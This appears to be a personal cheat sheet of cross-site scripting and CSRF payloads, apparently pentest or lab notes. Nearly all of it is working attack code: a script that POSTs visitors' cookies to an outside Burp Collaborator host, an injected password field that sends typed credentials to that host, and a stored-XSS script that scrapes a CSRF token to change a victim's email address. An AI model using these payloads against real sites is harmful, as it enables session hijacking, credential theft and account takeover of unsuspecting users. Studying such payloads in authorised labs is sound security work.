XSS

[*] Reflected
	Print the current working directory, server side, for the webpage you are on.
		/* Open the inspector tools and go to the console. */
		var loc = window.location.pathname;
		var dir = loc.substring(0, loc.lastIndexOf('/'));
		console.log(dir);

	Examples:
		<script>alert(document.domain);</script>
		<script>alert(document.cookie);</script>

[*] Stored
	XSS stored on server side - anyone will hit this by visiting site.
	Test Cross Site Scripting with html tags:
	<>
	</>
	<script>alert('xss');</script>
	Search field:
		<script>alert('xss');</script>
		<script>alert(document.cookie);</script>

	If you have Burpsuite Professional, collect someone's cookie:
		<script>
		fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
		method: 'POST',
		mode: 'no-cors',
		body:document.cookie
		});
		</script>
	
	If you have Burpsuite Professional, collect someone's credentials:
		<input name=username id=username>
		<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
		method:'POST',
		mode: 'no-cors',
		body:username.value+':'+this.value
		});">

[*] CSRF

	Example of changing an email address if logged in user sees stored XSS
		<script>
		var req = new XMLHttpRequest();
		req.onload = handleResponse;
		req.open('get','/email',true);
		req.send();
		function handleResponse() {
		    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
		    var changeReq = new XMLHttpRequest();
		    changeReq.open('post', '/email/change-email', true);
		    changeReq.send('csrf='+token+'&email=test@test.com')
		};
		</script>